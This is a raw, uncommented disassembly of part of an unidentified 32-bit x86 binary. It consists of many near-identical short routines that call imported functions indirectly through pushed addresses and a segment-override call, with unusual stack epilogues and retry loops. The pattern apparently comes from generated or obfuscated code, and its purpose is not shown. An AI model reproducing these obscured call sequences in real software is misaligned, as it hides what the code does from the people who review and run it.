  4014f3:	2e ff 10             	call   *%cs:(%eax)
  4014f6:	5a                   	pop    %edx
  4014f7:	52                   	push   %edx
  4014f8:	ff b2 00 05 00 00    	push   0x500(%edx)
  4014fe:	ff b2 e8 02 00 00    	push   0x2e8(%edx)
  401504:	e8 07 fd ff ff       	call   0x401210
  401509:	83 c4 08             	add    $0x8,%esp
  40150c:	5a                   	pop    %edx
  40150d:	52                   	push   %edx
  40150e:	8d 32                	lea    (%edx),%esi
  401510:	56                   	push   %esi
  401511:	68 4c 30 40 00       	push   $0x40304c
  401516:	58                   	pop    %eax
  401517:	2e ff 10             	call   *%cs:(%eax)
  40151a:	85 c0                	test   %eax,%eax
  40151c:	75 f0                	jne    0x40150e
  40151e:	5a                   	pop    %edx
  40151f:	83 ec a4             	sub    $0xffffffa4,%esp
  401522:	8b 2c 24             	mov    (%esp),%ebp
  401525:	83 c4 04             	add    $0x4,%esp
  401528:	c3                   	ret
  401529:	00 00                	add    %al,(%eax)
  40152b:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401531:	83 ec 50             	sub    $0x50,%esp
  401534:	52                   	push   %edx
  401535:	ff b2 e0 02 00 00    	push   0x2e0(%edx)
  40153b:	51                   	push   %ecx
  40153c:	56                   	push   %esi
  40153d:	e8 b6 fb ff ff       	call   0x4010f8
  401542:	83 c4 0c             	add    $0xc,%esp
  401545:	5a                   	pop    %edx
  401546:	52                   	push   %edx
  401547:	6a 00                	push   $0x0
  401549:	68 24 30 40 00       	push   $0x403024
  40154e:	58                   	pop    %eax
  40154f:	2e ff 10             	call   *%cs:(%eax)
  401552:	5a                   	pop    %edx
  401553:	52                   	push   %edx
  401554:	6a 00                	push   $0x0
  401556:	68 08 30 40 00       	push   $0x403008
  40155b:	58                   	pop    %eax
  40155c:	2e ff 10             	call   *%cs:(%eax)
  40155f:	5a                   	pop    %edx
  401560:	83 ec b0             	sub    $0xffffffb0,%esp
  401563:	8b 2c 24             	mov    (%esp),%ebp
  401566:	83 c4 04             	add    $0x4,%esp
  401569:	c3                   	ret
  40156a:	00 00                	add    %al,(%eax)
  40156c:	8b ff                	mov    %edi,%edi
  40156e:	55                   	push   %ebp
  40156f:	8b ec                	mov    %esp,%ebp
  401571:	83 ec 48             	sub    $0x48,%esp
  401574:	52                   	push   %edx
  401575:	ff b2 00 03 00 00    	push   0x300(%edx)
  40157b:	ff b2 54 04 00 00    	push   0x454(%edx)
  401581:	ff 72 2c             	push   0x2c(%edx)
  401584:	e8 b7 00 00 00       	call   0x401640
  401589:	83 c4 0c             	add    $0xc,%esp
  40158c:	5a                   	pop    %edx
  40158d:	52                   	push   %edx
  40158e:	b8 00 00 00 00       	mov    $0x0,%eax
  401593:	50                   	push   %eax
  401594:	68 34 30 40 00       	push   $0x403034
  401599:	58                   	pop    %eax
  40159a:	2e ff 10             	call   *%cs:(%eax)
  40159d:	5a                   	pop    %edx
  40159e:	52                   	push   %edx
  40159f:	68 40 30 40 00       	push   $0x403040
  4015a4:	58                   	pop    %eax
  4015a5:	2e ff 10             	call   *%cs:(%eax)
  4015a8:	5a                   	pop    %edx
  4015a9:	83 ec b8             	sub    $0xffffffb8,%esp
  4015ac:	8b 2c 24             	mov    (%esp),%ebp
  4015af:	83 c4 04             	add    $0x4,%esp
  4015b2:	c3                   	ret
  4015b3:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4015b9:	83 ec 54             	sub    $0x54,%esp
  4015bc:	52                   	push   %edx
  4015bd:	68 1c 30 40 00       	push   $0x40301c
  4015c2:	58                   	pop    %eax
  4015c3:	2e ff 10             	call   *%cs:(%eax)
  4015c6:	5a                   	pop    %edx
  4015c7:	52                   	push   %edx
  4015c8:	ff b2 48 03 00 00    	push   0x348(%edx)
  4015ce:	50                   	push   %eax
  4015cf:	e8 10 ff ff ff       	call   0x4014e4
  4015d4:	83 c4 08             	add    $0x8,%esp
  4015d7:	5a                   	pop    %edx
  4015d8:	52                   	push   %edx
  4015d9:	bb 00 00 00 00       	mov    $0x0,%ebx
  4015de:	53                   	push   %ebx
  4015df:	68 80 30 40 00       	push   $0x403080
  4015e4:	58                   	pop    %eax
  4015e5:	2e ff 10             	call   *%cs:(%eax)
  4015e8:	5a                   	pop    %edx
  4015e9:	83 ec ac             	sub    $0xffffffac,%esp
  4015ec:	8b 2c 24             	mov    (%esp),%ebp
  4015ef:	83 c4 04             	add    $0x4,%esp
  4015f2:	c3                   	ret
  4015f3:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4015f9:	83 ec 44             	sub    $0x44,%esp
  4015fc:	52                   	push   %edx
  4015fd:	57                   	push   %edi
  4015fe:	ff b2 cc 01 00 00    	push   0x1cc(%edx)
  401604:	53                   	push   %ebx
  401605:	53                   	push   %ebx
  401606:	e8 79 00 00 00       	call   0x401684
  40160b:	83 c4 10             	add    $0x10,%esp
  40160e:	5a                   	pop    %edx
  40160f:	52                   	push   %edx
  401610:	bb 00 00 00 00       	mov    $0x0,%ebx
  401615:	53                   	push   %ebx
  401616:	68 3c 30 40 00       	push   $0x40303c
  40161b:	58                   	pop    %eax
  40161c:	2e ff 10             	call   *%cs:(%eax)
  40161f:	5a                   	pop    %edx
  401620:	52                   	push   %edx
  401621:	8d 32                	lea    (%edx),%esi
  401623:	56                   	push   %esi
  401624:	68 4c 30 40 00       	push   $0x40304c
  401629:	58                   	pop    %eax
  40162a:	2e ff 10             	call   *%cs:(%eax)
  40162d:	85 c0                	test   %eax,%eax
  40162f:	75 f0                	jne    0x401621
  401631:	5a                   	pop    %edx
  401632:	83 ec bc             	sub    $0xffffffbc,%esp
  401635:	8b 2c 24             	mov    (%esp),%ebp
  401638:	83 c4 04             	add    $0x4,%esp
  40163b:	c3                   	ret
  40163c:	00 00                	add    %al,(%eax)
  40163e:	00 00                	add    %al,(%eax)
  401640:	8b ff                	mov    %edi,%edi
  401642:	55                   	push   %ebp
  401643:	8b ec                	mov    %esp,%ebp
  401645:	83 ec 60             	sub    $0x60,%esp
  401648:	52                   	push   %edx
  401649:	51                   	push   %ecx
  40164a:	ff b2 34 03 00 00    	push   0x334(%edx)
  401650:	e8 33 05 00 00       	call   0x401b88
  401655:	83 c4 08             	add    $0x8,%esp
  401658:	5a                   	pop    %edx
  401659:	52                   	push   %edx
  40165a:	ba 00 00 00 00       	mov    $0x0,%edx
  40165f:	52                   	push   %edx
  401660:	68 68 30 40 00       	push   $0x403068
  401665:	58                   	pop    %eax
  401666:	2e ff 10             	call   *%cs:(%eax)
  401669:	5a                   	pop    %edx
  40166a:	52                   	push   %edx
  40166b:	6a 00                	push   $0x0
  40166d:	68 68 30 40 00       	push   $0x403068
  401672:	58                   	pop    %eax
  401673:	2e ff 10             	call   *%cs:(%eax)
  401676:	5a                   	pop    %edx
  401677:	83 ec a0             	sub    $0xffffffa0,%esp
  40167a:	8b 2c 24             	mov    (%esp),%ebp
  40167d:	83 c4 04             	add    $0x4,%esp
  401680:	c3                   	ret
  401681:	00 00                	add    %al,(%eax)
  401683:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401689:	83 ec 5c             	sub    $0x5c,%esp
  40168c:	52                   	push   %edx
  40168d:	8d 02                	lea    (%edx),%eax
  40168f:	50                   	push   %eax
  401690:	68 4c 30 40 00       	push   $0x40304c
  401695:	58                   	pop    %eax
  401696:	2e ff 10             	call   *%cs:(%eax)
  401699:	85 c0                	test   %eax,%eax
  40169b:	75 f0                	jne    0x40168d
  40169d:	5a                   	pop    %edx
  40169e:	52                   	push   %edx
  40169f:	50                   	push   %eax
  4016a0:	ff 72 44             	push   0x44(%edx)
  4016a3:	e8 bc 00 00 00       	call   0x401764
  4016a8:	83 c4 08             	add    $0x8,%esp
  4016ab:	5a                   	pop    %edx
  4016ac:	52                   	push   %edx
  4016ad:	ba 00 00 00 00       	mov    $0x0,%edx
  4016b2:	52                   	push   %edx
  4016b3:	68 80 30 40 00       	push   $0x403080
  4016b8:	58                   	pop    %eax
  4016b9:	2e ff 10             	call   *%cs:(%eax)
  4016bc:	5a                   	pop    %edx
  4016bd:	83 ec a4             	sub    $0xffffffa4,%esp
  4016c0:	8b 2c 24             	mov    (%esp),%ebp
  4016c3:	83 c4 04             	add    $0x4,%esp
  4016c6:	c3                   	ret
  4016c7:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4016cd:	83 ec 50             	sub    $0x50,%esp
  4016d0:	52                   	push   %edx
  4016d1:	ff b2 98 00 00 00    	push   0x98(%edx)
  4016d7:	51                   	push   %ecx
  4016d8:	50                   	push   %eax
  4016d9:	e8 46 fd ff ff       	call   0x401424
  4016de:	83 c4 0c             	add    $0xc,%esp
  4016e1:	5a                   	pop    %edx
  4016e2:	52                   	push   %edx
  4016e3:	bb 00 00 00 00       	mov    $0x0,%ebx
  4016e8:	53                   	push   %ebx
  4016e9:	68 68 30 40 00       	push   $0x403068
  4016ee:	58                   	pop    %eax
  4016ef:	2e ff 10             	call   *%cs:(%eax)
  4016f2:	5a                   	pop    %edx
  4016f3:	52                   	push   %edx
  4016f4:	6a 00                	push   $0x0
  4016f6:	68 0c 30 40 00       	push   $0x40300c
  4016fb:	58                   	pop    %eax
  4016fc:	2e ff 10             	call   *%cs:(%eax)
  4016ff:	5a                   	pop    %edx
  401700:	83 ec b0             	sub    $0xffffffb0,%esp
  401703:	8b 2c 24             	mov    (%esp),%ebp
  401706:	83 c4 04             	add    $0x4,%esp
  401709:	c3                   	ret
	...
  401712:	00 00                	add    %al,(%eax)
  401714:	8b ff                	mov    %edi,%edi
  401716:	55                   	push   %ebp
  401717:	8b ec                	mov    %esp,%ebp
  401719:	83 ec 4c             	sub    $0x4c,%esp
  40171c:	52                   	push   %edx
  40171d:	ff b2 20 01 00 00    	push   0x120(%edx)
  401723:	56                   	push   %esi
  401724:	51                   	push   %ecx
  401725:	e8 ba 00 00 00       	call   0x4017e4
  40172a:	83 c4 0c             	add    $0xc,%esp
  40172d:	5a                   	pop    %edx
  40172e:	52                   	push   %edx
  40172f:	b9 00 00 00 00       	mov    $0x0,%ecx
  401734:	51                   	push   %ecx
  401735:	68 0c 30 40 00       	push   $0x40300c
  40173a:	58                   	pop    %eax
  40173b:	2e ff 10             	call   *%cs:(%eax)
  40173e:	5a                   	pop    %edx
  40173f:	52                   	push   %edx
  401740:	8d 1a                	lea    (%edx),%ebx
  401742:	53                   	push   %ebx
  401743:	68 4c 30 40 00       	push   $0x40304c
  401748:	58                   	pop    %eax
  401749:	2e ff 10             	call   *%cs:(%eax)
  40174c:	85 c0                	test   %eax,%eax
  40174e:	75 f0                	jne    0x401740
  401750:	5a                   	pop    %edx
  401751:	83 ec b4             	sub    $0xffffffb4,%esp
  401754:	8b 2c 24             	mov    (%esp),%ebp
  401757:	83 c4 04             	add    $0x4,%esp
  40175a:	c3                   	ret
	...
  401763:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401769:	83 ec 58             	sub    $0x58,%esp
  40176c:	52                   	push   %edx
  40176d:	50                   	push   %eax
  40176e:	56                   	push   %esi
  40176f:	e8 a0 02 00 00       	call   0x401a14
  401774:	83 c4 08             	add    $0x8,%esp
  401777:	5a                   	pop    %edx
  401778:	52                   	push   %edx
  401779:	6a 00                	push   $0x0
  40177b:	68 80 30 40 00       	push   $0x403080
  401780:	58                   	pop    %eax
  401781:	2e ff 10             	call   *%cs:(%eax)
  401784:	5a                   	pop    %edx
  401785:	52                   	push   %edx
  401786:	6a 00                	push   $0x0
  401788:	68 2c 30 40 00       	push   $0x40302c
  40178d:	58                   	pop    %eax
  40178e:	2e ff 10             	call   *%cs:(%eax)
  401791:	5a                   	pop    %edx
  401792:	83 ec a8             	sub    $0xffffffa8,%esp
  401795:	8b 2c 24             	mov    (%esp),%ebp
  401798:	83 c4 04             	add    $0x4,%esp
  40179b:	c3                   	ret
  40179c:	8b ff                	mov    %edi,%edi
  40179e:	55                   	push   %ebp
  40179f:	8b ec                	mov    %esp,%ebp
  4017a1:	83 ec 3c             	sub    $0x3c,%esp
  4017a4:	52                   	push   %edx
  4017a5:	b9 00 00 00 00       	mov    $0x0,%ecx
  4017aa:	51                   	push   %ecx
  4017ab:	68 60 30 40 00       	push   $0x403060
  4017b0:	58                   	pop    %eax
  4017b1:	2e ff 10             	call   *%cs:(%eax)
  4017b4:	5a                   	pop    %edx
  4017b5:	52                   	push   %edx
  4017b6:	ff b2 44 04 00 00    	push   0x444(%edx)
  4017bc:	57                   	push   %edi
  4017bd:	e8 ee 05 00 00       	call   0x401db0
  4017c2:	83 c4 08             	add    $0x8,%esp
  4017c5:	5a                   	pop    %edx
  4017c6:	52                   	push   %edx
  4017c7:	68 1c 30 40 00       	push   $0x40301c
  4017cc:	58                   	pop    %eax
  4017cd:	2e ff 10             	call   *%cs:(%eax)
  4017d0:	5a                   	pop    %edx
  4017d1:	83 ec c4             	sub    $0xffffffc4,%esp
  4017d4:	8b 2c 24             	mov    (%esp),%ebp
  4017d7:	83 c4 04             	add    $0x4,%esp
  4017da:	c3                   	ret
	...
  4017e3:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4017e9:	83 ec 34             	sub    $0x34,%esp
  4017ec:	52                   	push   %edx
  4017ed:	6a 00                	push   $0x0
  4017ef:	68 44 30 40 00       	push   $0x403044
  4017f4:	58                   	pop    %eax
  4017f5:	2e ff 10             	call   *%cs:(%eax)
  4017f8:	5a                   	pop    %edx
  4017f9:	52                   	push   %edx
  4017fa:	ff b2 c8 00 00 00    	push   0xc8(%edx)
  401800:	56                   	push   %esi
  401801:	ff b2 ac 02 00 00    	push   0x2ac(%edx)
  401807:	50                   	push   %eax
  401808:	e8 e7 fd ff ff       	call   0x4015f4
  40180d:	83 c4 10             	add    $0x10,%esp
  401810:	5a                   	pop    %edx
  401811:	52                   	push   %edx
  401812:	8d 02                	lea    (%edx),%eax
  401814:	50                   	push   %eax
  401815:	68 4c 30 40 00       	push   $0x40304c
  40181a:	58                   	pop    %eax
  40181b:	2e ff 10             	call   *%cs:(%eax)
  40181e:	85 c0                	test   %eax,%eax
  401820:	75 f0                	jne    0x401812
  401822:	5a                   	pop    %edx
  401823:	83 ec cc             	sub    $0xffffffcc,%esp
  401826:	8b 2c 24             	mov    (%esp),%ebp
  401829:	83 c4 04             	add    $0x4,%esp
  40182c:	c3                   	ret
  40182d:	00 00                	add    %al,(%eax)
  40182f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401835:	83 ec 34             	sub    $0x34,%esp
  401838:	52                   	push   %edx
  401839:	ff 72 2c             	push   0x2c(%edx)
  40183c:	56                   	push   %esi
  40183d:	57                   	push   %edi
  40183e:	e8 39 00 00 00       	call   0x40187c
  401843:	83 c4 0c             	add    $0xc,%esp
  401846:	5a                   	pop    %edx
  401847:	52                   	push   %edx
  401848:	6a 00                	push   $0x0
  40184a:	68 18 30 40 00       	push   $0x403018
  40184f:	58                   	pop    %eax
  401850:	2e ff 10             	call   *%cs:(%eax)
  401853:	5a                   	pop    %edx
  401854:	52                   	push   %edx
  401855:	6a 00                	push   $0x0
  401857:	68 3c 30 40 00       	push   $0x40303c
  40185c:	58                   	pop    %eax
  40185d:	2e ff 10             	call   *%cs:(%eax)
  401860:	5a                   	pop    %edx
  401861:	83 ec cc             	sub    $0xffffffcc,%esp
  401864:	8b 2c 24             	mov    (%esp),%ebp
  401867:	83 c4 04             	add    $0x4,%esp
  40186a:	c3                   	ret
	...
  40187b:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401881:	83 ec 44             	sub    $0x44,%esp
  401884:	52                   	push   %edx
  401885:	6a 00                	push   $0x0
  401887:	68 00 30 40 00       	push   $0x403000
  40188c:	58                   	pop    %eax
  40188d:	2e ff 10             	call   *%cs:(%eax)
  401890:	5a                   	pop    %edx
  401891:	52                   	push   %edx
  401892:	57                   	push   %edi
  401893:	56                   	push   %esi
  401894:	ff b2 80 04 00 00    	push   0x480(%edx)
  40189a:	56                   	push   %esi
  40189b:	e8 60 00 00 00       	call   0x401900
  4018a0:	83 c4 10             	add    $0x10,%esp
  4018a3:	5a                   	pop    %edx
  4018a4:	52                   	push   %edx
  4018a5:	be 00 00 00 00       	mov    $0x0,%esi
  4018aa:	56                   	push   %esi
  4018ab:	68 44 30 40 00       	push   $0x403044
  4018b0:	58                   	pop    %eax
  4018b1:	2e ff 10             	call   *%cs:(%eax)
  4018b4:	5a                   	pop    %edx
  4018b5:	83 ec bc             	sub    $0xffffffbc,%esp
  4018b8:	8b 2c 24             	mov    (%esp),%ebp
  4018bb:	83 c4 04             	add    $0x4,%esp
  4018be:	c3                   	ret
  4018bf:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4018c5:	83 ec 20             	sub    $0x20,%esp
  4018c8:	52                   	push   %edx
  4018c9:	57                   	push   %edi
  4018ca:	57                   	push   %edi
  4018cb:	56                   	push   %esi
  4018cc:	e8 f7 fd ff ff       	call   0x4016c8
  4018d1:	83 c4 0c             	add    $0xc,%esp
  4018d4:	5a                   	pop    %edx
  4018d5:	52                   	push   %edx
  4018d6:	b8 00 00 00 00       	mov    $0x0,%eax
  4018db:	50                   	push   %eax
  4018dc:	68 68 30 40 00       	push   $0x403068
  4018e1:	58                   	pop    %eax
  4018e2:	2e ff 10             	call   *%cs:(%eax)
  4018e5:	5a                   	pop    %edx
  4018e6:	52                   	push   %edx
  4018e7:	6a 00                	push   $0x0
  4018e9:	68 24 30 40 00       	push   $0x403024
  4018ee:	58                   	pop    %eax
  4018ef:	2e ff 10             	call   *%cs:(%eax)
  4018f2:	5a                   	pop    %edx
  4018f3:	83 ec e0             	sub    $0xffffffe0,%esp
  4018f6:	8b 2c 24             	mov    (%esp),%ebp
  4018f9:	83 c4 04             	add    $0x4,%esp
  4018fc:	c3                   	ret
  4018fd:	00 00                	add    %al,(%eax)
  4018ff:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401905:	83 ec 28             	sub    $0x28,%esp
  401908:	52                   	push   %edx
  401909:	6a 00                	push   $0x0
  40190b:	68 24 30 40 00       	push   $0x403024
  401910:	58                   	pop    %eax
  401911:	2e ff 10             	call   *%cs:(%eax)
  401914:	5a                   	pop    %edx
  401915:	52                   	push   %edx
  401916:	ff b2 ac 05 00 00    	push   0x5ac(%edx)
  40191c:	51                   	push   %ecx
  40191d:	ff b2 8c 03 00 00    	push   0x38c(%edx)
  401923:	57                   	push   %edi
  401924:	e8 17 fa ff ff       	call   0x401340
  401929:	83 c4 10             	add    $0x10,%esp
  40192c:	5a                   	pop    %edx
  40192d:	52                   	push   %edx
  40192e:	6a 00                	push   $0x0
  401930:	68 3c 30 40 00       	push   $0x40303c
  401935:	58                   	pop    %eax
  401936:	2e ff 10             	call   *%cs:(%eax)
  401939:	5a                   	pop    %edx
  40193a:	83 ec d8             	sub    $0xffffffd8,%esp
  40193d:	8b 2c 24             	mov    (%esp),%ebp
  401940:	83 c4 04             	add    $0x4,%esp
  401943:	c3                   	ret
	...
  40194c:	8b ff                	mov    %edi,%edi
  40194e:	55                   	push   %ebp
  40194f:	8b ec                	mov    %esp,%ebp
  401951:	83 ec 60             	sub    $0x60,%esp
  401954:	52                   	push   %edx
  401955:	56                   	push   %esi
  401956:	51                   	push   %ecx
  401957:	e8 dc f7 ff ff       	call   0x401138
  40195c:	83 c4 08             	add    $0x8,%esp
  40195f:	5a                   	pop    %edx
  401960:	52                   	push   %edx
  401961:	68 40 30 40 00       	push   $0x403040
  401966:	58                   	pop    %eax
  401967:	2e ff 10             	call   *%cs:(%eax)
  40196a:	5a                   	pop    %edx
  40196b:	52                   	push   %edx
  40196c:	6a 00                	push   $0x0
  40196e:	68 80 30 40 00       	push   $0x403080
  401973:	58                   	pop    %eax
  401974:	2e ff 10             	call   *%cs:(%eax)
  401977:	5a                   	pop    %edx
  401978:	83 ec a0             	sub    $0xffffffa0,%esp
  40197b:	8b 2c 24             	mov    (%esp),%ebp
  40197e:	83 c4 04             	add    $0x4,%esp
  401981:	c3                   	ret
  401982:	00 00                	add    %al,(%eax)
  401984:	00 00                	add    %al,(%eax)
  401986:	00 00                	add    %al,(%eax)
  401988:	8b ff                	mov    %edi,%edi
  40198a:	55                   	push   %ebp
  40198b:	8b ec                	mov    %esp,%ebp
  40198d:	83 ec 38             	sub    $0x38,%esp
  401990:	52                   	push   %edx
  401991:	ff b2 10 03 00 00    	push   0x310(%edx)
  401997:	ff b2 a0 04 00 00    	push   0x4a0(%edx)
  40199d:	e8 c6 fa ff ff       	call   0x401468
  4019a2:	83 c4 08             	add    $0x8,%esp
  4019a5:	5a                   	pop    %edx
  4019a6:	52                   	push   %edx
  4019a7:	6a 00                	push   $0x0
  4019a9:	68 24 30 40 00       	push   $0x403024
  4019ae:	58                   	pop    %eax
  4019af:	2e ff 10             	call   *%cs:(%eax)
  4019b2:	5a                   	pop    %edx
  4019b3:	52                   	push   %edx
  4019b4:	6a 00                	push   $0x0
  4019b6:	68 24 30 40 00       	push   $0x403024
  4019bb:	58                   	pop    %eax
  4019bc:	2e ff 10             	call   *%cs:(%eax)
  4019bf:	5a                   	pop    %edx
  4019c0:	83 ec c8             	sub    $0xffffffc8,%esp
  4019c3:	8b 2c 24             	mov    (%esp),%ebp
  4019c6:	83 c4 04             	add    $0x4,%esp
  4019c9:	c3                   	ret
  4019ca:	00 00                	add    %al,(%eax)
  4019cc:	8b ff                	mov    %edi,%edi
  4019ce:	55                   	push   %ebp
  4019cf:	8b ec                	mov    %esp,%ebp
  4019d1:	83 ec 24             	sub    $0x24,%esp
  4019d4:	52                   	push   %edx
  4019d5:	56                   	push   %esi
  4019d6:	ff b2 54 03 00 00    	push   0x354(%edx)
  4019dc:	53                   	push   %ebx
  4019dd:	e8 fe f9 ff ff       	call   0x4013e0
  4019e2:	83 c4 0c             	add    $0xc,%esp
  4019e5:	5a                   	pop    %edx
  4019e6:	52                   	push   %edx
  4019e7:	8d 02                	lea    (%edx),%eax
  4019e9:	50                   	push   %eax
  4019ea:	68 4c 30 40 00       	push   $0x40304c
  4019ef:	58                   	pop    %eax
  4019f0:	2e ff 10             	call   *%cs:(%eax)
  4019f3:	85 c0                	test   %eax,%eax
  4019f5:	75 f0                	jne    0x4019e7
  4019f7:	5a                   	pop    %edx
  4019f8:	52                   	push   %edx
  4019f9:	ba 00 00 00 00       	mov    $0x0,%edx
  4019fe:	52                   	push   %edx
  4019ff:	68 80 30 40 00       	push   $0x403080
  401a04:	58                   	pop    %eax
  401a05:	2e ff 10             	call   *%cs:(%eax)
  401a08:	5a                   	pop    %edx
  401a09:	83 ec dc             	sub    $0xffffffdc,%esp
  401a0c:	8b 2c 24             	mov    (%esp),%ebp
  401a0f:	83 c4 04             	add    $0x4,%esp
  401a12:	c3                   	ret
  401a13:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401a19:	83 ec 40             	sub    $0x40,%esp
  401a1c:	52                   	push   %edx
  401a1d:	6a 00                	push   $0x0
  401a1f:	68 68 30 40 00       	push   $0x403068
  401a24:	58                   	pop    %eax
  401a25:	2e ff 10             	call   *%cs:(%eax)
  401a28:	5a                   	pop    %edx
  401a29:	52                   	push   %edx
  401a2a:	56                   	push   %esi
  401a2b:	ff b2 38 03 00 00    	push   0x338(%edx)
  401a31:	ff b2 6c 04 00 00    	push   0x46c(%edx)
  401a37:	ff b2 10 04 00 00    	push   0x410(%edx)
  401a3d:	e8 fe 00 00 00       	call   0x401b40
  401a42:	83 c4 10             	add    $0x10,%esp
  401a45:	5a                   	pop    %edx
  401a46:	52                   	push   %edx
  401a47:	6a 00                	push   $0x0
  401a49:	68 08 30 40 00       	push   $0x403008
  401a4e:	58                   	pop    %eax
  401a4f:	2e ff 10             	call   *%cs:(%eax)
  401a52:	5a                   	pop    %edx
  401a53:	83 ec c0             	sub    $0xffffffc0,%esp
  401a56:	8b 2c 24             	mov    (%esp),%ebp
  401a59:	83 c4 04             	add    $0x4,%esp
  401a5c:	c3                   	ret
  401a5d:	00 00                	add    %al,(%eax)
  401a5f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401a65:	83 ec 54             	sub    $0x54,%esp
  401a68:	52                   	push   %edx
  401a69:	bf 00 00 00 00       	mov    $0x0,%edi
  401a6e:	57                   	push   %edi
  401a6f:	68 24 30 40 00       	push   $0x403024
  401a74:	58                   	pop    %eax
  401a75:	2e ff 10             	call   *%cs:(%eax)
  401a78:	5a                   	pop    %edx
  401a79:	52                   	push   %edx
  401a7a:	ff b2 04 02 00 00    	push   0x204(%edx)
  401a80:	51                   	push   %ecx
  401a81:	ff b2 10 02 00 00    	push   0x210(%edx)
  401a87:	e8 c0 fe ff ff       	call   0x40194c
  401a8c:	83 c4 0c             	add    $0xc,%esp
  401a8f:	5a                   	pop    %edx
  401a90:	52                   	push   %edx
  401a91:	8d 32                	lea    (%edx),%esi
  401a93:	56                   	push   %esi
  401a94:	68 4c 30 40 00       	push   $0x40304c
  401a99:	58                   	pop    %eax
  401a9a:	2e ff 10             	call   *%cs:(%eax)
  401a9d:	85 c0                	test   %eax,%eax
  401a9f:	75 f0                	jne    0x401a91
  401aa1:	5a                   	pop    %edx
  401aa2:	83 ec ac             	sub    $0xffffffac,%esp
  401aa5:	8b 2c 24             	mov    (%esp),%ebp
  401aa8:	83 c4 04             	add    $0x4,%esp
  401aab:	c3                   	ret
  401aac:	00 00                	add    %al,(%eax)
  401aae:	00 00                	add    %al,(%eax)
  401ab0:	8b ff                	mov    %edi,%edi
  401ab2:	55                   	push   %ebp
  401ab3:	8b ec                	mov    %esp,%ebp
  401ab5:	83 ec 44             	sub    $0x44,%esp
  401ab8:	52                   	push   %edx
  401ab9:	6a 00                	push   $0x0
  401abb:	68 60 30 40 00       	push   $0x403060
  401ac0:	58                   	pop    %eax
  401ac1:	2e ff 10             	call   *%cs:(%eax)
  401ac4:	5a                   	pop    %edx
  401ac5:	52                   	push   %edx
  401ac6:	ff b2 fc 00 00 00    	push   0xfc(%edx)
  401acc:	57                   	push   %edi
  401acd:	56                   	push   %esi
  401ace:	e8 ad f6 ff ff       	call   0x401180
  401ad3:	83 c4 0c             	add    $0xc,%esp
  401ad6:	5a                   	pop    %edx
  401ad7:	52                   	push   %edx
  401ad8:	be 00 00 00 00       	mov    $0x0,%esi
  401add:	56                   	push   %esi
  401ade:	68 60 30 40 00       	push   $0x403060
  401ae3:	58                   	pop    %eax
  401ae4:	2e ff 10             	call   *%cs:(%eax)
  401ae7:	5a                   	pop    %edx
  401ae8:	83 ec bc             	sub    $0xffffffbc,%esp
  401aeb:	8b 2c 24             	mov    (%esp),%ebp
  401aee:	83 c4 04             	add    $0x4,%esp
  401af1:	c3                   	ret
  401af2:	00 00                	add    %al,(%eax)
  401af4:	00 00                	add    %al,(%eax)
  401af6:	00 00                	add    %al,(%eax)
  401af8:	8b ff                	mov    %edi,%edi
  401afa:	55                   	push   %ebp
  401afb:	8b ec                	mov    %esp,%ebp
  401afd:	83 ec 60             	sub    $0x60,%esp
  401b00:	52                   	push   %edx
  401b01:	ff b2 ec 00 00 00    	push   0xec(%edx)
  401b07:	56                   	push   %esi
  401b08:	ff b2 28 02 00 00    	push   0x228(%edx)
  401b0e:	e8 29 03 00 00       	call   0x401e3c
  401b13:	83 c4 0c             	add    $0xc,%esp
  401b16:	5a                   	pop    %edx
  401b17:	52                   	push   %edx
  401b18:	6a 00                	push   $0x0
  401b1a:	68 18 30 40 00       	push   $0x403018
  401b1f:	58                   	pop    %eax
  401b20:	2e ff 10             	call   *%cs:(%eax)
  401b23:	5a                   	pop    %edx
  401b24:	52                   	push   %edx
  401b25:	6a 00                	push   $0x0
  401b27:	68 08 30 40 00       	push   $0x403008
  401b2c:	58                   	pop    %eax
  401b2d:	2e ff 10             	call   *%cs:(%eax)
  401b30:	5a                   	pop    %edx
  401b31:	83 ec a0             	sub    $0xffffffa0,%esp
  401b34:	8b 2c 24             	mov    (%esp),%ebp
  401b37:	83 c4 04             	add    $0x4,%esp
  401b3a:	c3                   	ret
  401b3b:	00 00                	add    %al,(%eax)
  401b3d:	00 00                	add    %al,(%eax)
  401b3f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401b45:	83 ec 40             	sub    $0x40,%esp
  401b48:	52                   	push   %edx
  401b49:	ff b2 b8 01 00 00    	push   0x1b8(%edx)
  401b4f:	ff b2 dc 05 00 00    	push   0x5dc(%edx)
  401b55:	e8 42 f7 ff ff       	call   0x40129c
  401b5a:	83 c4 08             	add    $0x8,%esp
  401b5d:	5a                   	pop    %edx
  401b5e:	52                   	push   %edx
  401b5f:	6a 00                	push   $0x0
  401b61:	68 44 30 40 00       	push   $0x403044
  401b66:	58                   	pop    %eax
  401b67:	2e ff 10             	call   *%cs:(%eax)
  401b6a:	5a                   	pop    %edx
  401b6b:	52                   	push   %edx
  401b6c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401b71:	51                   	push   %ecx
  401b72:	68 80 30 40 00       	push   $0x403080
  401b77:	58                   	pop    %eax
  401b78:	2e ff 10             	call   *%cs:(%eax)
  401b7b:	5a                   	pop    %edx
  401b7c:	83 ec c0             	sub    $0xffffffc0,%esp
  401b7f:	8b 2c 24             	mov    (%esp),%ebp
  401b82:	83 c4 04             	add    $0x4,%esp
  401b85:	c3                   	ret
  401b86:	00 00                	add    %al,(%eax)
  401b88:	8b ff                	mov    %edi,%edi
  401b8a:	55                   	push   %ebp
  401b8b:	8b ec                	mov    %esp,%ebp
  401b8d:	83 ec 40             	sub    $0x40,%esp
  401b90:	52                   	push   %edx
  401b91:	6a 00                	push   $0x0
